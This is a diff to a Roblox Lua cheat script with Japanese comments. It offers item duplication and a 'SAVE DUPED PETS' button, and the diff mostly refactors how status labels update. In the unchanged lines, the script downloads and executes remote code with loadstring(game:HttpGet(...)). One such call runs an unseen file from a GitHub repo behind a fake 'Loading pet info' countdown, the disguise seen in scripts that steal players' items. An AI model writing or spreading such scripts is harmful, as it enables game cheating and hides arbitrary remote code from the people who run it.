@@ -4,15 +4,15 @@ local player = Players.LocalPlayer
 
 -- Kavo UIのロード
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("2.0 - New Flow", "Midnight") 
+local Window = Library.CreateLib("2.0 - New Flow", "Midnight")
 
 -- メインタブ作成
 local MainTab = Window:NewTab("Main")
 local MainSection = MainTab:NewSection("Main Controls")
 
--- ツール名表示ラベル（初期値：Nothing）
+-- ツール名表示ラベル
 local currentTool = "Nothing"
-MainSection:NewLabel("Holding: " .. currentTool)
+local toolLabel = MainSection:NewLabel("Holding: " .. currentTool)
 
 -- 定期更新：現在持っているツール名を表示
 RunService.RenderStepped:Connect(function()
@@ -20,7 +20,8 @@ RunService.RenderStepped:Connect(function()
 	local name = tool and tool.Name or "Nothing"
 	if name ~= currentTool then
 		currentTool = name
-		MainSection:UpdateLabel("Holding: " .. currentTool)
+		toolLabel:Remove()
+		toolLabel = MainSection:NewLabel("Holding: " .. currentTool)
 	end
 end)
 
@@ -48,35 +49,36 @@ MainSection:NewButton("DUPE", "Duplicate your tool", function()
 	end
 end)
 
--- 状態表示用ラベル
+-- 状態表示ラベル（再生成のため参照）
 local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
+local function setStatus(text)
+	statusLabel:Remove()
+	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
+end
 
--- ボタン参照を保持
+-- SAVE DUPED PETS ボタン（30秒後にスクリプト実行、1回のみ押せる）
 local saveButton
-
--- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
 saveButton = MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
-	-- 押されたらボタン削除
 	if saveButton then
 		saveButton:Remove()
 	end
 
 	task.spawn(function()
 		for i = 30, 1, -1 do
-			statusLabel:UpdateLabel("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
+			setStatus("⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
 		end
 
-		statusLabel:UpdateLabel("SAVE STATUS: 🚀 Booting...")
+		setStatus("🚀 Booting...")
 
 		local success, err = pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
 		end)
 
 		if success then
-			statusLabel:UpdateLabel("SAVE STATUS: ✅ Success!")
+			setStatus("✅ Success!")
 		else
-			statusLabel:UpdateLabel("SAVE STATUS: ❌ Error: " .. tostring(err))
+			setStatus("❌ Error: " .. tostring(err))
 		end
 	end)
 end)
